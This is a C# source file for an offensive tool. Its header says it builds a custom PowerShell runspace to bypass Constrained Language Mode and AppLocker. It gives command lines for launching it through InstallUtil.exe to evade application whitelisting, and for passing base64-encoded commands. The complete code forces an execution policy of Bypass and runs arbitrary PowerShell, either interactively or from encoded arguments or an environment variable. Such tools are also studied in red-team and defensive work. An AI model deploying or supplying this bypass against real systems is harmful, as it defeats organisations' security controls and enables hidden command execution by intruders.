/*
 * This program invokes a custom PowerShell runspace in order to bypass Constrained Language Mode and AppLocker.
 *
 * To run the shell interactively, either directly:
 * > .\PSRunspace.exe
 * or via InstallUtil to circumvent AppLocker restrictions:
 * > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /LogFile= /LogToConsole=false /u .\PSRunspace.exe
 *
 * To run non-interactively, specify commands as base64-encoded UTF16LE strings (as in powershell.exe -Enc ...).
 * Via commandline arguments:
 * > .\PSRunspace.exe bgBlAHQAIAB1AHMAZQByAA==
 * or via environment variable:
 * > $env:PSCMD = "bgBlAHQAIAB1AHMAZQByAA=="
 * > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /LogFile= /LogToConsole=false /u .\PSRunspace.exe
 *
 * The program attempts to show regular output as well as errors.
 * Note that is does not capture other output streams like Warning or Debug.
 */

using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.IO;
using System.Management.Automation.Runspaces;
using System.Text;

namespace CustomRunspace
{
    [RunInstaller(true)]
    public class PSRunspace : Installer
    {
        public static void Main(string[] args)
        {
            Console.SetIn(new StreamReader(Console.OpenStandardInput(), Console.InputEncoding, false, bufferSize: 4096));
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            Exec(rs, "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process");
            string envcmd = Environment.GetEnvironmentVariable("PSCMD");

            if (args.Length > 0)
            {
                foreach (var arg in args)
                {
                    string cmdline = Encoding.Unicode.GetString(Convert.FromBase64String(arg));
                    Exec(rs, cmdline);
                }
            }
            else if (!string.IsNullOrEmpty(envcmd))
            {
                string cmdline = Encoding.Unicode.GetString(Convert.FromBase64String(envcmd));
                Exec(rs, cmdline);
            }
            else
            {
                while (true)
                {
                    Console.Write("FullPS {0}> ", rs.SessionStateProxy.Path.CurrentLocation.Path.ToString());
                    string cmdline = Console.ReadLine();
                    if (cmdline == "exit")
                    {
                        break;
                    }
                    Exec(rs, cmdline);
                }
            }

            rs.Close();
        }

        private static void Exec(Runspace rs, string cmdline)
        {
            using (Pipeline p = rs.CreatePipeline())
            {
                try
                {
                    p.Commands.AddScript(cmdline);
                    p.Commands.Add("Out-String");
                    var res = p.Invoke();
                    foreach (var r in res)
                    {
                        Console.WriteLine(r.ToString());
                    }
                    foreach (var err in p.Error.ReadToEnd())
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(err.ToString());
                        Console.ResetColor();
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(ex.ToString());
                    Console.ResetColor();
                }
            }
        }

        public override void Install(IDictionary savedState)
        {
            Main(new string[0]);
        }

        public override void Uninstall(IDictionary savedState)
        {
            Main(new string[0]);
        }
    }
}
